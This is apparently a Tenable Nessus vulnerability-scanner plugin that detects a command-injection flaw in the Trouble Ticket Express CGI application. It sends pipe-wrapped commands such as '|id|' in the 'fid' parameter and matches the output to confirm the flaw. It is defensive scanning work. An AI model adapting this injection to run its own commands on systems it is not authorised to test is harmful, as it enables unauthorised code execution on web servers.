#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(45083);
  script_version("$Revision: 1.6 $");
 script_cvs_date("$Date: 2015/09/24 23:21:21 $");

  script_bugtraq_id(38765);
  script_osvdb_id(62997);
  script_xref(name:"EDB-ID", value:"11723");

  script_name(english:"Trouble Ticket Express fid Parameter Arbitrary Remote Code Execution");
  script_summary(english:"Tries to run a command");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server contains a CGI application that allows
arbitrary command execution."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The remote host is running Trouble Ticket Express, an open source
web-based trouble ticket application written in Perl.

At least one module included with the version of Trouble Ticket
Express hosted on the remote web server fails to sanitize input to the
'fid' parameter of the 'ttx.cgi' script before using it in an 'open()'
statement.

An unauthenticated remote attacker can leverage this issue to execute
arbitrary commands subject to the privileges under which the web
server operates."
  );
  script_set_attribute(attribute:"see_also", value:"http://www.troubleticketexpress.com/alert.html");
  script_set_attribute(
    attribute:"see_also",
    value:"http://forum.unitedwebcoders.com/index.php/topic,1143.0.html"
  );
  script_set_attribute(attribute:"solution", value:"Update to revision 759 of TTXFile.pm / revision 765 of TTXImage.pm.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2010/03/14");
  script_set_attribute(attribute:"patch_publication_date", value:"2010/03/15");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/03/17");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2010-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("webapp_func.inc");


port = get_http_port(default:80, embedded:FALSE);


os = get_kb_item("Host/OS");
if (os)
{
  if ("Windows" >< os) cmd = "ipconfig /all";
  else cmd = "id";
  cmds = make_list(cmd);
}
else cmds = make_list("id", "ipconfig /all");
cmd_pats = make_array();
cmd_pats["id"] = "uid=[0-9]+.*gid=[0-9]+.*";
cmd_pats["ipconfig /all"] = "Subnet Mask";


# Loop through directories.
output = "";
ttx_installs = 0;
vuln_urls = make_list();

if (thorough_tests) dirs = list_uniq(make_list("/ttx", "/trouble_ticket_express", "/ticket", "/tickets", "/support", "/cgi-bin/support", "/cgi-bin/ttx", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Unless we're paranoid, make sure the affected software is installed.
  if (report_paranoia < 2)
  {
    url = dir + '/ttx.cgi';
    res = http_send_recv3(port:port, method:"GET", item:url, exit_on_fail:TRUE);

    if (
      res[2] &&
      (
        "ttx.cgi?cmd=ticket" >< res[2] ||
        "ttx.cgi?cmd=newticket" >< res[2]
      )
    ) ttx_installs++;
    else continue;
  }

  # Try to exploit the issue(s) to run a command.
  #
  # - Image module (introduced in version 3.0).
  foreach cmd (cmds)
  {
    url = dir + '/ttx.cgi?' +
      'cmd=img&' +
      'fid=' + urlencode(str:'|'+cmd+'|');

    res = http_send_recv3(port:port, method:"GET", item:url, exit_on_fail:TRUE);
    if (res[2] && egrep(pattern:cmd_pats[cmd], string:res[2]))
    {
      vuln_urls = make_list(vuln_urls, url);
      if (!output) output = chomp(res[2]);
      break;
    }
  }
  if (output && !thorough_tests) break;

  # - File module (optional, but should may exist in any version).
  foreach cmd (cmds)
  {
    url = dir + '/ttx.cgi?' +
      'cmd=file&' +
      'fid=' + urlencode(str:'|'+cmd+'|');

    res = http_send_recv3(port:port, method:"GET", item:url, exit_on_fail:TRUE);
    if (res[2] && egrep(pattern:cmd_pats[cmd], string:res[2]))
    {
      vuln_urls = make_list(vuln_urls, url);
      if (!output) output = chomp(res[2]);
      break;
    }
  }
}
if (max_index(vuln_urls))
{
  if (report_verbosity > 0)
  {
    if (max_index(vuln_urls) == 1) s = '';
    else s = 's';
    header =
      "Nessus was able to execute the command '" + cmd + "' on the remote" + '\n' +
      'host using the following URL' + s;
    trailer = '';

    if (report_verbosity > 1)
    {
      trailer =
        'This produced the following output :\n' +
        '\n' +
        crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
        output + '\n' +
        crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n';
    }
    report = get_vuln_report(items:vuln_urls, port:port, header:header, trailer:trailer);
    security_hole(port:port, extra:report);
  }
  else security_hole(port);
  exit(0);
}
else
{
  if (ttx_installs == 0) exit(0, "No installs of Trouble Ticket Express were found on the web server on port "+port+".");
  else if (ttx_installs == 1) exit(0, "The Trouble Ticket Express install hosted on the web server on port "+port+" is not affected.");
  else exit(0, "The Trouble Ticket Express installs hosted on the web server on port "+port+" are not affected.");
}
